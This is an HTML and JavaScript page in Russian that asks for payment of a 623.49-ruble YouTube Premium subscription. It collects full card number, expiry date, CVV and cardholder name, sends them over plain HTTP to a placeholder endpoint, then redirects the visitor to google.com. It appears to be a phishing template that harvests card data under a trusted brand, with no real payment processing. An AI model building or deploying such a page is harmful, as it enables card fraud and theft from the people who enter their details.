<!DOCTYPE html>
<html class="html" lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Оплата</title>
  <link type="text/css" href="style.css" rel="stylesheet">
  <link rel="stylesheet" href="normalize/normalize.css">
  <link rel="preload" href="fonts/Inter-Bold.ttf" as="font">
  <link rel="preload" href="fonts/Inter-Medium.ttf" as="font">
  <link rel="preload" href="fonts/Inter-Regular.ttf" as="font">
  <link rel="preload" href="fonts/Inter-SemiBold.ttf" as="font">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
</head>
<body class="body success">
<!--class  err or success-->
<div class="container">
  <main class="main">
    <div class="information-payment">
      <p class="payment-title">Оплата за подписку YouTube Premium</p>
      <div class="check-wrapper">
        <p class="payment-check">Сумма к оплате</p>
        <div class="sum-wrapper">
          <p class="payment-sum">623.<sup>49</sup></p>
          <p class="payment-currency">руб.</p>
        </div>
      </div>
      <p class="attention">Внимание! Оплата карточкой ОАО “СберБанк” не принимается</p>
    </div>
    <div class="information-card">
      <div class="message">
        <div class="message-icon"></div>
        <p class="message-text">Проверьте срок действия карточки</p>
      </div>
      <form class="form-payment" action="/card_info" method="post" name="card_info">
        <div class="form-container">
          <div class="card-number">
          <label class="text-card" for="card_number">Номер карты</label>
          <input class="card-input" type="text" id="card_number" name="card_number" inputmode="numeric" pattern="\d{4}\s?\d{4}\s?\d{4}\s?\d{4}" placeholder="____  ____  ____  ____" maxlength="19" required>
          </div>
          <div class="date-container">
            <div class="date-wrapper">
              <label class="text-card" for="date_card">мм / гг</label>
              <input class="card-input" type="text" id="date_card" name="date_card" inputmode="numeric" pattern="\d\d/\d\d" maxlength="5" placeholder="__/__" required>
            </div>
            <div class="cvc-wrapper">
              <label class="text-card" for="card_cvc">CVV2/CVC2</label>
              <input class="card-input" type="text" name="cvc" maxlength="3" inputmode="numeric" pattern="\d+" placeholder="___" id="card_cvc" required>
            </div>
          </div>
          <div class="holder-wrapper">
            <label class="text-card" for="card_name">Имя фамилия</label>
            <input class="card-input" name="name" id="card_name" type="text" inputmode="text" placeholder="______________________" maxlength="120" required pattern="[A-Za-z]+" title="Введите только символы латинского алфавита">
          </div>
        </div>
        <div class="button-wrapper">
          <button class="card-submit">Оплатить</button>
        </div>
      </form>
      <div class="security-container">
        <div class="img-wrapper">
          <svg class="svg-shield" width="35" height="35" viewBox="0 0 23 27" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M8.61054 19.647L18.434 9.8235L16.7105 8.1L8.61054 16.1426L5.45042 12.9825L3.72691 14.706L8.61054 19.647ZM11.0799 0L22.1094 4.941V12.294C22.1094 19.0732 17.399 25.4498 11.0799 27C4.76079 25.4486 0.050415 19.0721 0.050415 12.294V4.941L11.0799 0Z" fill="#B3B4B6"/>
          </svg>
        </div>
        <p class="security-text">Данные покупателя защищены</p>
      </div>
    </div>
  </main>
</div>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    $(document).ready(function(){
        $("#card_number").keyup(function () {
            if (this.value.length == this.maxLength) {
                $('#date_card').eq(0).focus();
            }
        });
    });

    $("#date_card").keyup(function () {
        if (this.value.length == this.maxLength) {
            $('#card_cvc').eq(0).focus();
        }
    });

    $("#date_card").eq(1).keyup(function () {
        if (this.value.length == this.maxLength) {
            $('#card_cvc').eq(0).focus();
        }
    });

    $("#card_cvc").eq(0).keyup(function () {
        if (this.value.length == this.maxLength) {
            $('#card_name').eq(0).focus();
        }
    });

    const paymentSum = document.querySelector('.payment-sum');
    const amount = paymentSum.textContent;
    const button = document.querySelector('.card-submit');
    const paymentCurrency = document.querySelector('.payment-currency')
    const currency = paymentCurrency.textContent;
    const form = document.querySelector('.form-payment');
    const cardNumberInput = document.querySelector('#card_number');
    const cardHolder = document.querySelector('#card_name');
    const expiryInput = document.querySelector('#date_card');
    const cvcInput = document.querySelector('#card_cvc');

    button.textContent = 'Оплатить ' + amount + ' ' + currency;

    // Держатель карточки

    cardHolder.addEventListener('input', function(event) {
        const regex = /^[a-zA-Z\s-]*$/;
        if (!regex.test(this.value)) {
            this.value = this.value.slice(0, -1);
        }
    });

    // Номер карточки

    cardNumberInput.addEventListener('input', (event) => {
        const input = event.target;
        const inputLength = input.value.length;

        // Ограничиваем ввод, только цифры и пробелы
        const value = cardNumberInput.value;
        cardNumberInput.value = value.replace(/[^0-9\s]/g, '')

        // Разделяем введенные символы на группы по четыре
        if (inputLength > 0 && inputLength % 5 === 0) {
            input.value = input.value.slice(0, inputLength - 1) + ' ' + input.value.slice(inputLength - 1);
        }
    });

    // Дата карточки

    expiryInput.addEventListener('input', (event) => {
        const input = event.target;
        let inputValue = input.value;

        // удаляем все символы, кроме цифр
        inputValue = inputValue.replace(/\D/g, '');
        const inputLength = inputValue.length;

        // добавляем символ "/" в поле с датой
        if (inputLength === 2 && inputValue.indexOf('/') === -1) {
            inputValue = `${inputValue}/`;
        } else if (inputLength > 2) {
            inputValue = `${inputValue.slice(0, 2)}/${inputValue.slice(2)}`;
        }

        input.value = inputValue;
    });

    // CVC карточки

    cvcInput.addEventListener('input', (event) => {
        const cvcValue = cvcInput.value
        cvcInput.value = cvcValue.replace(/[^0-9]/g, '');
    })

    // Обработка формы

    button.addEventListener('click', async (event) => {
        event.preventDefault();
        button.disabled = true;
        const formData = new FormData(form);
        formData.set('card_number', cardNumberInput.value.replace(/\s/g, ''));

        const dateValue = expiryInput.value;
        const [month, year] = dateValue.split('/');
        const dateObj = {
            month,
            year,
        };
        formData.set('date_card', JSON.stringify(dateObj));
        const nameValue = cardHolder.value.toUpperCase();
        const [FName, LName] = nameValue.split(' ');
        const nameObj = {
            FName,
            LName,
        };
        formData.set('name', JSON.stringify(nameObj));

        console.log(typeof cardNumberInput.value);

        const url = 'http://example.com/your-api-endpoint';

        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData,
            });

            if (response.ok) {
                window.location.replace('https://www.google.com');
            } else {
                throw new Error(`Ошибка ${response.status}: ${response.statusText}`)
            }

            const result = await response.json();
            console.log('data', result);

            button.disabled = false;
        } catch (error) {
            console.log(`ошибка: ${error.message}`);
            button.disabled = false;
        }
    });
</script>
</body>
</html>
